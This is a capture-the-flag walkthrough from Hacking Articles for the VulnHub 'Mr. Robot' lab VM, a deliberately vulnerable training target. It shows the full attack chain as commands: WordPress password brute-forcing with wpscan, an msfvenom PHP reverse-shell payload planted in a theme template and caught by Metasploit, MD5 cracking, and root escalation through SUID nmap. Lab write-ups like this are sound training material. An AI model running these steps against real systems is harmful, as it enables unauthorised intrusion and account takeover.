@@ -1,0 +1,115 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Mr. Robot VM (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-mr-robot-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-08-29T08:55:24+00:00">August 29, 2016</time><time class="updated" datetime="2025-06-10T20:30:42+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">This is our another article of root2boot penetration testing challenge. We will walk through an exploitable framework Mr. Robot. It is based on the TV show, Mr. Robot, it has three keys hidden in different locations. The main goal is to find all three tokens hidden in the system. Each key is progressively difficult to find. Breaking into it isn’t too difficult. There isn’t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.</span></p>
+<p><span style="color: #000000;">First Download the Mr. Robot Lab from<a style="color: #000000;" href="https://www.vulnhub.com/entry/mr-robot-1,151/"> <strong>here</strong></a></span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
+<li><span style="color: #000000;">Recon (Nikto)</span></li>
+<li><span style="color: #000000;">Use robot.txt</span></li>
+<li><span style="color: #000000;">Grab 1st key</span></li>
+<li><span style="color: #000000;">Download fsocity.dic file and use a dictionary</span></li>
+<li><span style="color: #000000;">WordPress password cracking (wpscan)</span></li>
+<li><span style="color: #000000;">Login into WordPress</span></li>
+<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
+<li><span style="color: #000000;">Upload and execute a backdoor</span></li>
+<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
+<li><span style="color: #000000;">Get MD5 hash and decrypt it</span></li>
+<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
+<li><span style="color: #000000;">Find / perm u=s for Privilege Escalation</span></li>
+<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
+</ul>
+<p><span style="color: #000000;">First of all, we have to find its IP address and for that go to the terminal of your Kali and type :</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YqeYk7xebAM/Wu3FCB3vEvI/AAAAAAAAWrg/Rx7wBsSMUoYPhViAB2LHWxUclZdUqRhywCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Upon the execution of the above command, we will know about all the IP addresses in our network. Our target IP is <strong>192.168.1.103</strong>, let us scan it.</span></p>
+<p><span style="color: #000000;">To scan our target IP we will use aggressive scan (-A)</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.103</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pBBZD0ioNhw/Wu3FEMeSdVI/AAAAAAAAWsE/0JKxSQUB7CA_VoW_qAmgUTHgAKUsdVdFACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">The scan’s result shows us the open ports are: 22, 80, and 443. As the 80 port is open we can try and open this IP in our browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XizpEqhZ-lw/Wu3FEyUv3hI/AAAAAAAAWsI/o9cJyX9tjAcx-qGu-iUMoXeKtqF4G8KAwCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">And yes, it opens which further confirms our target.</span></p>
+<p><span style="color: #000000;">Next, we will apply the Nikto command to it. Nitko command will help us to gather information like its files and all the other major stuff that we ought to know about our target. So, therefore, type:</span></p>
+<pre class="lang:default decode:true">nitko -h 192.168.1.103</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-F0mVlktnGZQ/Wu3FFLPRntI/AAAAAAAAWsM/6up-1OxQuKw6XWPzyvC_R2y-u9QJNTNIwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">From the result, we can gather that there a text file with the name of <strong>robots.txt</strong> which might provide us with some further information. Moreover, it also tells us that the WordPress installation was found.</span></p>
+<p><span style="color: #000000;">So now let us try to open <strong>robots.txt</strong> in the browser. Yesssssssss!! It gave something to us let open each file one-by-one.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-DrqgOl3Jmew/Wu3FFVAJGsI/AAAAAAAAWsU/M-EoS9LrDtYjcc5P-LWLkp_z9FZ6J4MoACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Excellent!!! Inside <strong>key-1-of-3.txt</strong> we found our 1<sup>st </sup>key.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-_6pH20IkkpQ/Wu3FFUWTnkI/AAAAAAAAWsQ/Z4srSjOrgUECNIt3uXGBbwvrz7u9se5fACLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Now open <strong>fsocity.dic</strong> file in the browser which is a dictionary file. Let us first try and open this dictionary file the browser. Once we open the said dictionary file in the browser, it asks us to download it. Going ahead we downloaded and opened it. It is a file which may contain username or passwords.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tCnpjVKhHjY/Wu3FFu-ez_I/AAAAAAAAWsY/m5pOtQxGcR4bydF1lj8jkuZY6H8tAXiUgCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">So now we know that we might have username or passwords, we will try and login into our target. One by one we have tried every username and it has given the error that <strong>the username doesn’t exist</strong>.  But when we used the name <strong>elliot</strong> it gave us the error that the <strong>password is empty.</strong></span></p>
+<p><span style="color: #000000;">With this, we know one thing for sure that elliot is a correct username and now we just have to find a password for it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bc1Oa2pSgWg/Wu3FGIGXqeI/AAAAAAAAWsc/hLwSi2n0U3Awi3al7gQzQg7YICOj4W-VACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Our best guess to find the password the same dictionary file from which we found the username. Thus, moving forward we will use <strong>WPScan</strong> to find our password from the same file.</span></p>
+<pre class="lang:default decode:true">wpscan -u http://192.168.1.103/ --username Elliot --wordlist /root/Desktop/fsocity.dic</pre>
+<p><span style="color: #000000;">When the execution is completed (which may time much time as in our case it took almost 4 hours) you will have the password for the username elliot which is </span></p>
+<pre class="lang:default decode:true">ER28-0652</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Z_dno-FA0iM/Wu3FGEUxHJI/AAAAAAAAWsg/PBQviQNNO8MmGP6wMhVZDOQOTqbG40WogCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Using the password, login into the WordPress and open 404 templates to add a new theme.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ko5Thzrg1d4/Wu3FCTkKskI/AAAAAAAAWro/FN7FjoGNeh0p1LN8QnRRWhdH67YLOizfACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Once you have logged in, make the malicious file that you got to upload in it. Generate code through the <strong>msfvenom </strong>command:</span></p>
+<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
+</pre>
+<p><span style="color: #000000;">On the other hand run multi/handler inside Metasploit framework.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-wW8_TeAY9rg/Wu3FCC27sLI/AAAAAAAAWrk/u_ONdCQXk_8RwzhdxOp2A7NP87ppzMNSwCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Copy the code from <strong>&lt;?php</strong> to <strong>die(); </strong>and paste it on template(and save it)</span></p>
+<p><span style="color: #000000;">Now you have access to a WordPress admin console is to replace one of the theme templates with some PHP of your own. I decided to try for a reverse shell by editing the <strong>404.php</strong> theme and replacing the contents with the msfvenom generated shell.</span></p>
+<p><span style="color: #000000;">Once the php code is saved, then, open the path of the template in the browser as shown: </span><span style="color: #000000;">Browsing to </span></p>
+<pre class="lang:default decode:true">http://192.168.1.103/wp-content/themes/twentyfifteen/404.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YzAHnkYeVVM/Wu3FCqHHSdI/AAAAAAAAWrs/5XBJiTeU5107798j7uZFJB-4vcOsI0s4ACLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
+<pre class="lang:default decode:true">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.108
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;">From given below image you can observe <strong>meterpreter session 1</strong>. But the task is not finished yet, still, we need to penetrate more for privilege escalation.</span></p>
+<pre class="lang:default decode:true">cd home
+ls</pre>
+<p><span style="color: #000000;">Now, to know the information about the robot folder/file we will type:</span></p>
+<p><span style="color: #000000;">We now know that there are two important files, one of them is a text file other is a password in the form of MD5. If we try to open the text file by typing:</span></p>
+<pre class="lang:default decode:true">cat key-2-of-3.txt</pre>
+<p><span style="color: #000000;">It will not open as we do not have the permission to do so. But now let us try and open the MD5 file and for that type:</span></p>
+<pre class="lang:default decode:true">cat password.raw-md5</pre>
+<p><span style="color: #000000;">Executing the above command will give an MD5 value (hash value) of the password as you can see below:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-znDfPX22ZdY/Wu3FC5WgWHI/AAAAAAAAWrw/kHNaXsXp6rcJnGiJftyiBPSs_XaAK88WACLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">We will use md5 online decrypting tool for cracking this MD5 value. Enter the MD5 value into the hash box and obtain the result. The value will translate to <strong>abcdefghijklmnopqrstuvwxyz </strong>as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dNgyPPjg35o/Wu3FC-PS4uI/AAAAAAAAWr0/N2Jjpr_myWsSeGPbuplf_EjQUUhSHtbcgCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Then to access proper TTY shell we had import python one line script by typing following:</span></p>
+<pre class="lang:default decode:true">shell
+python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Now in the terminal try to switch the user to the robot by the command:</span></p>
+<pre class="lang:default decode:true">su robot</pre>
+<p><span style="color: #000000;">Following the command, it will ask you for the password. Enter the MD5 cracked password here and you will enter the robot user and gain its information type:</span></p>
+<pre class="lang:default decode:true">ls</pre>
+<p><span style="color: #000000;">Now, try to open the remaining text file by typing:</span></p>
+<pre class="lang:default decode:true">cat key-2-of-3.txt</pre>
+<p><span style="color: #000000;">Here I will read the second key file</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-L-md4kdwv-A/Wu3FDalYbPI/AAAAAAAAWr8/qovDJdMaeaw-KrPNNvw_zhGvisGjQvQgACLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Now let’s find out all those files having root privilege by using the following command.</span></p>
+<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">It has shown so many binary files but I was interested in nmap from its output result.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lfYu_vILZio/Wu3FDUW9YZI/AAAAAAAAWr4/0ijKij3MdxA32O6-tXqphxPwHXHccxBqwCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Nmap supported an option called “<strong><em>interactive</em></strong><em>.”</em> With this option, users were able to execute shell commands by using a nmap “shell” (<strong>interactive shell</strong>). </span></p>
+<p><span style="color: #000000;">Next type the following:</span></p>
+<pre class="lang:default decode:true ">nmap --interactive</pre>
+<p><span style="color: #000000;">With the above commands you will enter nmap then type:</span></p>
+<pre class="lang:default decode:true">!sh
+id
+cd /root
+ls -lsa
+cat key-3-of-3.txt</pre>
+<p><span style="color: #000000;">And upon the execution of we will obtain 3 of 3 keys, hence entering Mr. Robot. There are many ways to perform the above but this method is the easiest. We hope you find it effective and interesting and it helps you to improve.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-nVNgQkSreQ8/Wu3FDmsvm7I/AAAAAAAAWsA/c1c4LyyZnWwwo2hXgJJ-6Vp0bJ1a-rNjACLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
